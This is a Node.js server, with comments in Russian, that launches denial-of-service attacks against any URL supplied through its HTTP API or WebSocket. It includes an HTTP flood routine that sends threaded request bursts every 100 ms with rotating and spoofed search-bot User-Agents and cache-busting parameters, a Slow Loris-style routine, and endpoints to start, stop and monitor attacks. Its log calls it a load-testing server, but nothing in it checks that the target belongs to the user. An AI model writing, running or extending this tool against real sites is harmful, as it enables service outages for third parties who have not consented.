const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Хранилище активных атак
const activeAttacks = new Map();

// Статистика
const stats = {
    totalRequests: 0,
    successfulRequests: 0,
    failedRequests: 0,
    activeAttacks: 0
};

// Функция для отправки запроса
async function sendRequest(targetUrl, method, headers, body = null) {
    try {
        const config = {
            method: method,
            url: targetUrl,
            headers: headers,
            timeout: 10000,
            validateStatus: function (status) {
                return status >= 200 && status < 600; // Принимаем все статусы
            }
        };

        if (body && (method === 'POST' || method === 'PUT')) {
            config.data = body;
        }

        const response = await axios(config);
        return { success: true, status: response.status };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// Генерация случайных User-Agent
function getRandomUserAgent(type) {
    const userAgents = {
        mobile: [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
            'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ],
        desktop: [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ],
        bots: [
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
        ]
    };

    const agents = userAgents[type] || [...userAgents.mobile, ...userAgents.desktop, ...userAgents.bots];
    return agents[Math.floor(Math.random() * agents.length)];
}

// HTTP Flood атака
function startHTTPFlood(attackId, targetUrl, threads, duration, method, userAgentType, ws) {
    let requestsSent = 0;
    let successfulRequests = 0;
    const startTime = Date.now();
    
    const attackInterval = setInterval(() => {
        if (Date.now() - startTime >= duration * 1000) {
            stopAttack(attackId);
            return;
        }

        // Отправка запросов в нескольких потоках
        for (let i = 0; i < threads; i++) {
            const headers = {
                'User-Agent': getRandomUserAgent(userAgentType),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
                'Cache-Control': 'no-cache'
            };

            sendRequest(targetUrl + '?cache=' + Math.random(), method, headers)
                .then(result => {
                    requestsSent++;
                    stats.totalRequests++;
                    
                    if (result.success) {
                        successfulRequests++;
                        stats.successfulRequests++;
                    } else {
                        stats.failedRequests++;
                    }

                    // Отправка статистики через WebSocket
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({
                            type: 'stats',
                            data: {
                                totalRequests: requestsSent,
                                successfulRequests: successfulRequests,
                                successRate: requestsSent > 0 ? ((successfulRequests / requestsSent) * 100).toFixed(2) : 0,
                                requestsPerSecond: Math.round(requestsSent / ((Date.now() - startTime) / 1000)) || 0,
                                elapsedTime: Math.floor((Date.now() - startTime) / 1000)
                            }
                        }));
                    }
                })
                .catch(() => {
                    requestsSent++;
                    stats.totalRequests++;
                    stats.failedRequests++;
                });
        }
    }, 100);

    activeAttacks.set(attackId, {
        interval: attackInterval,
        type: 'http-flood',
        startTime: startTime,
        ws: ws
    });
}

// Slow Loris атака
function startSlowLoris(attackId, targetUrl, threads, duration, ws) {
    const startTime = Date.now();
    const connections = [];
    
    // Создание медленных соединений
    for (let i = 0; i < threads; i++) {
        const headers = {
            'User-Agent': getRandomUserAgent('desktop'),
            'Content-Length': '1000000',
            'Connection': 'keep-alive'
        };

        const slowRequest = setInterval(() => {
            if (Date.now() - startTime >= duration * 1000) {
                stopAttack(attackId);
                return;
            }

            sendRequest(targetUrl, 'GET', headers)
                .then(result => {
                    stats.totalRequests++;
                    if (result.success) {
                        stats.successfulRequests++;
                    } else {
                        stats.failedRequests++;
                    }
                });
        }, 10000); // Медленные запросы каждые 10 секунд

        connections.push(slowRequest);
    }

    activeAttacks.set(attackId, {
        intervals: connections,
        type: 'slow-loris',
        startTime: startTime,
        ws: ws
    });
}

// Остановка атаки
function stopAttack(attackId) {
    const attack = activeAttacks.get(attackId);
    if (attack) {
        if (attack.interval) {
            clearInterval(attack.interval);
        }
        if (attack.intervals) {
            attack.intervals.forEach(interval => clearInterval(interval));
        }
        activeAttacks.delete(attackId);
        stats.activeAttacks = activeAttacks.size;
        
        // Уведомление клиента
        if (attack.ws && attack.ws.readyState === WebSocket.OPEN) {
            attack.ws.send(JSON.stringify({
                type: 'attackStopped',
                message: 'Атака остановлена'
            }));
        }
    }
}

// API Routes
app.post('/api/start-attack', (req, res) => {
    const { targetUrl, threads, duration, attackType, method, userAgents } = req.body;
    
    if (!targetUrl) {
        return res.status(400).json({ error: 'Target URL is required' });
    }

    const attackId = 'attack_' + Date.now();
    
    // Запуск атаки в фоновом режиме
    setTimeout(() => {
        switch (attackType) {
            case 'http-flood':
                startHTTPFlood(attackId, targetUrl, threads, duration, method, userAgents, null);
                break;
            case 'slow-loris':
                startSlowLoris(attackId, targetUrl, threads, duration, null);
                break;
            default:
                startHTTPFlood(attackId, targetUrl, threads, duration, method, userAgents, null);
        }
    }, 100);

    stats.activeAttacks = activeAttacks.size;
    
    res.json({ 
        success: true, 
        attackId: attackId,
        message: `Атака запущена на ${duration} секунд`
    });
});

app.post('/api/stop-attack', (req, res) => {
    const { attackId } = req.body;
    
    if (attackId === 'all') {
        activeAttacks.forEach((attack, id) => {
            stopAttack(id);
        });
    } else if (activeAttacks.has(attackId)) {
        stopAttack(attackId);
    }
    
    res.json({ success: true, message: 'Атака остановлена' });
});

app.get('/api/stats', (req, res) => {
    res.json(stats);
});

app.get('/api/active-attacks', (req, res) => {
    const attacks = [];
    activeAttacks.forEach((attack, id) => {
        attacks.push({
            id: id,
            type: attack.type,
            startTime: attack.startTime,
            duration: Math.floor((Date.now() - attack.startTime) / 1000)
        });
    });
    res.json(attacks);
});

// WebSocket для реального времени
wss.on('connection', (ws) => {
    console.log('Новое WebSocket соединение');
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            
            if (data.type === 'startAttack') {
                const { targetUrl, threads, duration, attackType, method, userAgents } = data;
                const attackId = 'ws_attack_' + Date.now();
                
                switch (attackType) {
                    case 'http-flood':
                        startHTTPFlood(attackId, targetUrl, threads, duration, method, userAgents, ws);
                        break;
                    case 'slow-loris':
                        startSlowLoris(attackId, targetUrl, threads, duration, ws);
                        break;
                    default:
                        startHTTPFlood(attackId, targetUrl, threads, duration, method, userAgents, ws);
                }
                
                ws.send(JSON.stringify({
                    type: 'attackStarted',
                    attackId: attackId,
                    message: 'Атака запущена'
                }));
            }
            else if (data.type === 'stopAttack') {
                stopAttack(data.attackId);
            }
        } catch (error) {
            console.error('WebSocket error:', error);
        }
    });
    
    ws.on('close', () => {
        console.log('WebSocket соединение закрыто');
    });
});

// Обслуживание HTML страницы
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
    console.log(`🚀 Сервер нагрузочного тестирования запущен на порту ${PORT}`);
    console.log(`📊 Статистика доступна по адресу: http://localhost:${PORT}/api/stats`);
    console.log(`⚡ Активные атаки: http://localhost:${PORT}/api/active-attacks`);
});